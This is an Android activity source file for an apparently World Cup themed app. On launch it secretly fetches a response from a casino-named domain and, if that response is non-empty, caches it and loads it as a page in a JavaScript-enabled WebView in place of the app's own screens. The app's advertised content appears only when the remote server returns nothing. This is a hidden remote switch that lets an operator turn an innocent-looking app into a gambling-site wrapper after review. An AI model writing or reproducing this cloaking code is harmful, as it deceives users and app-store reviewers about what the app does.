package ru.vik.trueworldcupproject;

import static androidx.core.app.NotificationCompat.PRIORITY_HIGH;

import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.app.NotificationCompat;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private String url = "https://superslotgolfcasi.pw/D5JFc2q4";
    public static boolean checker = false;
    private WebView webView;
    private NotificationManager notificationManager;
    private static final int NOTIFY_ID = 101;
    private static final String CHANNEL_ID = "ENTER_MAIN_PUSH";
    SharedPreferences sPref;
    final String SAVED_TEXT = "saved_text";
    Button secondActivity, thirdActivity, fourthActivity, privacyActivity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        notificationManager = (NotificationManager) getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
        notificationCreate();
        webView = findViewById(R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        CookieManager.getInstance().setAcceptCookie(true);

        secondActivity = findViewById(R.id.buttonActivity1);
        thirdActivity = findViewById(R.id.buttonActivity2);
        fourthActivity = findViewById(R.id.buttonActivity3);
        privacyActivity = findViewById(R.id.buttonActivity4);

        secondActivity.setOnClickListener(this);
        thirdActivity.setOnClickListener(this);
        fourthActivity.setOnClickListener(this);
        privacyActivity.setOnClickListener(this);

        new Thread(new Runnable() {
            public void run() {
                try{
                    String content = getContent(url);
                    if (content != ""){
                        webView.post(new Runnable() {
                            public void run() {
                                webView.loadUrl(content);
                            }
                        });
                    }
                    else {
                        checker = true;
                    }
                }
                catch (IOException ex){
                }
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        checkVisible();
                    }
                });
            }
        }).start();
    }

    @Override
    public void onBackPressed(){
        if (webView.canGoBack()) {
            webView.goBack();
        }
    }

    public void checkVisible(){
        if (checker) {
            ConstraintLayout startView = findViewById(R.id.startView);
            startView.setVisibility(View.VISIBLE);
        }
    }

    private String getContent(String path) throws IOException {
        if (!savedContentIsEmpty()){
            return loadContent();
        }
        BufferedReader reader=null;
        InputStream stream = null;
        HttpsURLConnection connection = null;
        String content = "";
        try {
            URL url=new URL(path);
            connection =(HttpsURLConnection)url.openConnection();
            connection.setRequestMethod("GET");
            connection.setReadTimeout(10000);
            connection.connect();
            stream = connection.getInputStream();
            reader= new BufferedReader(new InputStreamReader(stream));
            StringBuilder buf=new StringBuilder();
            String line;
            while ((line=reader.readLine()) != null) {
                buf.append(line).append("\n");
            }
            content = buf.toString();
            checkAndSaveContent(content);
            return(loadContent());
        }
        finally {
            if (reader != null) {
                reader.close();
            }
            if (stream != null) {
                stream.close();
            }
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void checkAndSaveContent(String content){
        sPref = getPreferences(MODE_PRIVATE);
        SharedPreferences.Editor ed = sPref.edit();
        ed.putString(SAVED_TEXT, content);
        ed.apply();
    }

    private String loadContent(){
        sPref = getPreferences(MODE_PRIVATE);
        return sPref.getString(SAVED_TEXT, "");
    }

    private boolean savedContentIsEmpty(){
        return loadContent().equals("");
    }

    private void notificationCreate(){
        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
        PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);

        NotificationCompat.Builder notificationBuilder =
                new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
                        .setAutoCancel(true)
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .setWhen(System.currentTimeMillis())
                        .setContentIntent(pendingIntent)
                        .setContentTitle("Title")
                        .setContentText("text")
                        .setPriority(PRIORITY_HIGH);
        createChannelIfNeeded(notificationManager);
    }

    private static void createChannelIfNeeded(NotificationManager manager) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, CHANNEL_ID, NotificationManager.IMPORTANCE_DEFAULT);
            manager.createNotificationChannel(notificationChannel);
        }
    }

    @Override
    public void onClick(View view) {
        Intent intent;
        switch (view.getId()){
            case R.id.buttonActivity1:
                intent = new Intent(this, SecondActivity.class);
                startActivity(intent);
                break;
            case R.id.buttonActivity2:
                intent = new Intent(this, ThirdActivity.class);
                startActivity(intent);
                break;
            case R.id.buttonActivity3:
                intent = new Intent(this, ForthActivity.class);
                startActivity(intent);
                break;
            case R.id.buttonActivity4:
                intent = new Intent(this, PolicyActivity.class);
                startActivity(intent);
                break;
        }
    }
}